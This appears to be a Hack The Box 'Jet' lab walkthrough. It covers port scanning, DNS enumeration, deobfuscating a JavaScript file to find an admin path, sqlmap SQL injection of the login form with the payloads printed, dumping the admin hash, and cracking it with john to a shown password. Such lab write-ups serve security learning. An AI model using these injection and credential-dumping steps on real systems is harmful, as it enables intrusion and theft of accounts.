y# Jet
#HTB #Fortress 
IP : 10.13.37.10

## Recon 

Fire up nmap, to do a port scan

```bash
nmap -sV -sC -p- 10.13.37.10
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:            
|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)   
|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA) 
|\_  256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519) 
53/tcp   open  domain   ISC BIND 9.10.3-P4 (Ubuntu Linux)  
| dns-nsid:               
|\_  bind.version: 9.10.3-P4-Ubuntu                                                           
80/tcp   open  http     nginx 1.10.3 (Ubuntu)                                      
|\_http-server-header: nginx/1.10.3 (Ubuntu)                                                                 
|\_http-title: Welcome to nginx on Debian!                                                               
5555/tcp open  freeciv?
7777/tcp open  cbt?   
| fingerprint-strings: 
|   Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, Socks5, X11Probe:                     
|     Create a memo 
|     Show memo      
|     Delete memo                                
|     Cant you read mate?                                              
|   NULL:                                                                         
|     --==\[\[ Spiritual Memo \]\]==-- 
|     Create a memo 
|     Show memo 
    Delete memo
8000/tcp open  tcpwrapped   
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
9201/tcp open  http     BaseHTTPServer 0.3 (Python 2.7.12)   
| \_http-title: Site doesnt have a title (application/json) 
``` 


Head over to the http site and get the first flag.
![[Pasted image 20210524084857.png]]

The box is running a DNS lets try query it for domain names.

dig \@{dns ip} -x {ip lookup}
	
	
```bash
dig @10.13.37.10 -x 10.13.37.10  
 <<>> DiG 9.16.15-Debian <<>> @10.13.37.10 -x 10.13.37.10  
 (1 server found)  
 global options: +cmd  
 Got answer:  
->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 45014  
flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1  
 WARNING: recursion requested but not available  

 OPT PSEUDOSECTION:  
EDNS: version: 0, flags:; udp: 4096  
 QUESTION SECTION:  
10.37.13.10.in-addr.arpa.      IN      PTR  

 AUTHORITY SECTION:  
37.13.10.in-addr.arpa.  604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800  

 Query time: 140 msec  
SERVER: 10.13.37.10#53(10.13.37.10)  
 WHEN: mán maí 24 08:51:24 CEST 2021  
 MSG SIZE  rcvd: 109
```
	
	
And we get a domain name *securewebinc.jet* and it to the host file.

```bash
echo "10.13.37.10 www.securewebinc.jet securewebinc.jet" >> /etc/hosts
```

Head over to *www.securewebinc.jet*

![[Pasted image 20210524085916.png]]
Scroll to the bottom of the site and get the second flag.
Time to look at some source code.
We learn of two customs script *secure.js* and *template.js*

*secure.js* is a obfuscated javascript, let deopfuscate it. 
```js
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```

Go to jsnice.org put in the code and nicify it. and wee get this.

```js
'use strict';
/**
 * @return {undefined}
 */
function getStats() {
  $.ajax({
    url : "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",
    success : function(result) {
      $("#attacks").html(result);
    },
    error : function(result) {
      console.log(result);
    }
  });
}
getStats();
setInterval(function() {
  getStats();
}, 10000);

```

We get a new url to follow. lets head there now
*/dirb_safe_dir_rf9EmcEIx/admin/stats.php"*
return to us with a number. 
*1621841262*

Lets remove stats.php
*/dirb_safe_dir_rf9EmcEIx/admin/*

![[Pasted image 20210524091658.png]]

And we find a flag in the source code.

Fire up burp suite so we have the options to capture the POST request to the server, when we try to authenticate. 

![[Pasted image 20210524100127.png]]

Save the request to at file so we can use it in sqlmap

sqlmap -r request_file  random http agent, test level, risk of the test, enumerate DBMS databases. 

```bash
sqlmap -r dologin.txt --random-agent --level=5 --risk=3 --dbs
...snip...
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? \[y/N\] n  
sqlmap identified the following injection point(s) with a total of 1717 HTTP(s) requests:  
\---  
Parameter: username (POST)  
   Type: error-based  
   Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)  
   Payload: username=admin' AND (SELECT 7422 FROM(SELECT COUNT(\*),CONCAT(0x717a787171,(SELECT (ELT(7422=7422,1))),0x7171786a71,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)-- RRPr&password=\`1=1  
  
   Type: time-based blind  
   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)  
   Payload: username=admin' AND (SELECT 9644 FROM (SELECT(SLEEP(5)))wTkq)-- gvdk&password=\`1=1  
\---  
\[19:04:16\] \[INFO\] the back-end DBMS is MySQL  
\[19:04:16\] \[CRITICAL\] unable to connect to the target URL. sqlmap is going to retry the request(s)  
web server operating system: Linux Ubuntu  
web application technology: Nginx 1.10.3  
back-end DBMS: MySQL >= 5.0  
\[19:04:18\] \[INFO\] fetching columns for table 'users' in database 'jetadmin'  
\[19:04:18\] \[INFO\] retrieved: 'id'  
\[19:04:18\] \[INFO\] retrieved: 'int(11)'  
\[19:04:19\] \[INFO\] retrieved: 'username'  
\[19:04:19\] \[INFO\] retrieved: 'varchar(50)'  
\[19:04:19\] \[INFO\] retrieved: 'password'  
\[19:04:19\] \[INFO\] retrieved: 'varchar(191)'  
\[19:04:19\] \[INFO\] fetching entries for table 'users' in database 'jetadmin'  
\[19:04:19\] \[INFO\] retrieved: '1'  
\[19:04:20\] \[INFO\] retrieved: '97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084'  
\[19:04:20\] \[INFO\] retrieved: 'admin'  
\[19:04:20\] \[INFO\] recognized possible password hashes in column 'password'
```

What do we learn? We learn there is a database called jetadmin that have a table with the name of users. Lets try and dump the data of user table, we will run sqlmap again but add the database of jetadmin and users table as parameters 

```bash
sqlmap -r dologin.txt --random-agent --level=5 --risk=3 -D jetadmin -T users --dump

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 7422 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(7422=7422,1))),0x7171786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RRPr&password=`1=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 9644 FROM (SELECT(SLEEP(5)))wTkq)-- gvdk&password=`1=1
---
[19:36:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0
[19:36:50] [INFO] fetching columns for table 'users' in database 'jetadmin'
[19:36:50] [INFO] resumed: 'id'
[19:36:50] [INFO] resumed: 'int(11)'
[19:36:50] [INFO] resumed: 'username'
[19:36:50] [INFO] resumed: 'varchar(50)'
[19:36:50] [INFO] resumed: 'password'
[19:36:50] [INFO] resumed: 'varchar(191)'
[19:36:50] [INFO] fetching entries for table 'users' in database 'jetadmin'
[19:37:20] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[19:37:20] [INFO] retrieved: '1'
[19:37:21] [INFO] retrieved: '97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084'
[19:37:21] [INFO] retrieved: 'admin'
[19:37:21] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+

[19:37:43] [INFO] table 'jetadmin.users' dumped to CSV file '/home/avhn/.local/share/sqlmap/output/www.securewebinc.jet/dump/jetadmin/users.csv'
[19:37:43] [INFO] fetched data logged to text files under '/home/avhn/.local/share/sqlmap/output/www.securewebinc.jet'

[*] ending @ 19:37:43 /2021-05-24/

```

We got the user admin and the password hash. Lets crack it using  john. 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash  --format=Raw-SHA256
Using default input encoding: UTF-8  
Loaded 1 password hash (Raw-SHA256 \[SHA256 256/256 AVX2 8x\])  
Warning: poor OpenMP scalability for this hash type, consider --fork=8  
Will run 8 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Hackthesystem200 (?)  
1g 0:00:00:01 DONE (2021-05-24 19:48) 0.7751g/s 8636Kp/s 8636Kc/s 8636KC/s Josiah21..Galgenwaard  
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably  
Session completed
```
Show the password. 
```bash
john hash --show  --format=Raw-SHA256   
?:Hackthesystem200
```

Creds : admin:Hackthesystem200

Login and get the next flag. 